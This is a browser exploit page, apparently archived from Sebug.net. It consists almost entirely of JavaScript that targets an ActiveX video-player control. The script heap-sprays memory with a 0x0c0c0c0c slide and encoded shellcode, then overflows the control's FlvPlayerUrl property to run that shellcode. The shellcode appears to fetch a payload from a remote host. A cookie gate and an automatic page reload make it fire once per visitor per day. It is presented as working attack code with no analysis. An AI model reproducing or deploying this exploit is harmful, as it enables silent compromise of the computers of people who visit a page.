<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>

<SCRIPT language="JavaScript">
var expires = new Date();
expires.setTime(expires.getTime() + 24 * 60 * 60 * 1000);
var set_cookie = document.cookie.indexOf("3Ware=");
if (set_cookie == -1){document.cookie = "3Ware=1;expires=" + expires.toGMTString();
document.write('<object id="gl" classid="clsid:F3E70CEA-956E-49CC-B444-73AFE593AD7F"></object>');
var helloworld2Address = 0x0c0c0c0c;
var shellcode = unescape("%u10eb%u4b5b%uc933%ub966%u029b%u3480%ufe0b%ufae2%u05eb%uebe8%uffff%u17ff%ufcc4%ufefe%u94a1%ua7ce%u759a%u75ff%uf2be%u8e75%u53e2%u9675%u75f6%u9409%ua7f9%u2416%ufeff%u1cfe%ube07%uc67e%u8b3d%u7704%udab8%u9196%ufe90%u96fe%u8c8b%u9392%u94aa%ua7ff%uf875%u5e16%ufeff%u6bfe%u4a16%ufeff%u73fe%uc940%ufeff%ua9fe%u0196%ufefe%u01fe%ufaa8%u39fd%ufe39%u80a2%ud080%ube39%u9bfa%u9b86%ua9fe%ua801%ucdf6%uad25%ua9ad%ub873%uaec6%u01ad%ue2a8%u9294%u9096%u9a8a%uaa92%uff94%u75a7%u16f8%uffa7%ufefe%u1675%ubefd%u75c2%ue2b6%u8675%ufdd2%u9a03%ueb75%ufece%ufefe%u6c75%ufe56%ufefe%u0f96%udbb3%u962b%ub30f%u2bdb%u3796%ua0ac%u01ad%u6aca%ub871%u39d6%ud2b8%u7fb3%uefce%u4696%ufecc%u96fe%uce46%ufefe%u4696%ufed7%u75fe%u6afa%ub99e%uf9c7%ufc8a%u071c%u8077%u9fce%u4696%uffe1%u96fe%ueb46%ufeff%u4696%ufe0e%u75fe%u6afa%uc7b9%u8af9%u1cfc%u7707%uca80%ufe94%u9b96%ucd92%u96cc%u9b95%u908c%u94aa%ua7ff%uf875%u2c16%ufefe%u75fe%ufd26%uc2be%u3e7d%u75e6%u9686%u05fd%u817d%ufeee%u8b8a%ub175%ufdf2%u7f35%u90c7%u9a8a%u8b92%u759d%ufdd1%u7d15%ufe83%u8afe%u75a7%ufebb%uba73%ufce6%u37cd%u40f1%uc4ee%u8a28%u3ff6%uf937%u34fd%u15be%uc50f%ud6b0%ue48b%ud59e%ufdd1%uee91%uaaae%ufa94%ufa94%u01ab%ue6a8%u01a6%uce88%ubb71%u9ffe%ue315%ub0c5%u8bd2%u9ee6%ud1d5%u91fd%uaeee%u94aa%u94fa%uabfa%ua801%ua6e6%u8801%u71ca%ufebb%u7d9f%ufa3b%u5f15%u397d%u15ea%u757b%uea80%u94aa%u94fa%ua981%ua801%u39e6%u96f9%uf4f6%ucdfe%u763e%ufab9%u0275%uec94%u55a7%u031c%u3998%udaba%uffc2%u75ff%u7302%ueeb9%uaea9%uafaf%uafaf%uafaf%u73af%uc978%ufeff%uaefe%ua801%u7ff2%u763a%ufeff%u3cfe%ufede%ua801%u75ee%udaa8%ua5bf%ufdac%ufd1f%ufd1f%ufd1f%u7d1f%ufa12%uada4%u2475%u091c%u01ac%uaf1e%u75a8%uc28b%u8a75%u86d0%u0bfd%u75a8%ude88%u0bfd%u37cd%ubfb7%ufd53%ucd3b%uf125%uee40%u28c4%uf68a%u353f%ufdf9%ube24%u0f15%ue1c5%u198b%u75a0%udaa0%u23fd%u7598%ub5f2%ua075%ufde2%u7523%u75fa%u3bfd%ua055%u3da7%u3f16%u0103%ucc01%u6f8a%uc7f2%u831c%u877d%u18c7%u3766%u5842%u9d95%u2f77%u0eb1%u85b6%ue0c3%u9a5a%u7e11%u5128%ub364%uce7f%ufeef%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe%ufefe%u96fe%u8a8a%uc48e%ud1d1%u8989%ud089%ucd89%ud39d%u8c91%ud099%u919d%ud193%ucd89%ud09d%u869b%ufe9b");
var hbshelloworld = 0x100000;
var payLoadSize = shellcode.length * 2;
var spraySlideSize = hbshelloworld - (payLoadSize+0x38);
var spraySlide = unescape("%u0c0c%u0c0c");
spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (helloworld2Address - 0x100000)/hbshelloworld;
memory = new Array();
for (i=0;i<heapBlocks;i++)
{
memory[i] = spraySlide + shellcode;
}
function getSpraySlide(spraySlide, spraySlideSize)
{
while (spraySlide.length*2<spraySlideSize)
{
spraySlide += spraySlide;
}
spraySlide = spraySlide.substring(0,spraySlideSize/2);
return spraySlide;
}
var size_buff = 1070;
var x = unescape("%0c%0c%0c%0c");
while (x.length<size_buff) x += x;
gl.FlvPlayerUrl = x;
}
</SCRIPT>
<script>
if (set_cookie == -1){
location.reload();
}
</script>


//Sebug.net
